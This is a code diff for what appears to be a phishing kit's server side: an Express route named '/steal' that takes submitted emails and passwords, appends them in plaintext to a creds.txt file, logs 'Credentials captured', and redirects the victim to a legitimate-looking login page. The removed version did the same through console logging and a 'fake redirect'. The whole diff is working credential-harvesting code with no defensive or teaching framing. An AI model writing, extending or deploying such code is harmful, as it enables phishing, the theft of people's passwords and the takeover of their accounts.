@@ -1,19 +1,28 @@
-export default async function handler(req, res) {
-  if (req.method === 'POST') {
-    try {
-      const { email, password } = req.body;
+import express from "express";
+import fs from "fs";
+import path from "path";
+import { fileURLToPath } from "url";
+import { dirname } from "path";
 
-      // For testing: log it to Vercel console (no file persistence!)
-      console.log(`Email: ${email} | Password: ${password}`);
+const router = express.Router();
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = dirname(__filename);
+const logsPath = path.join(__dirname, "../logs/creds.txt");
 
-      // Fake redirect to legit-looking page
-      res.writeHead(302, { Location: 'https://example.com/login' });
-      res.end();
-    } catch (err) {
-      console.error(err);
-      res.status(500).json({ message: 'Server error' });
+router.post("/steal", (req, res) => {
+  const { email, password } = req.body;
+
+  const log = `Email: ${email} | Password: ${password}\n`;
+
+  fs.appendFile(logsPath, log, (err) => {
+    if (err) {
+      console.error("Error writing to file:", err);
+      return res.status(500).send("Error occurred.");
     }
-  } else {
-    res.status(405).send('Method not allowed');
-  }
-}
+
+    console.log(`📝 Credentials captured: ${email}`);
+    res.redirect("https://example.com/login");
+  });
+});
+
+export default router;
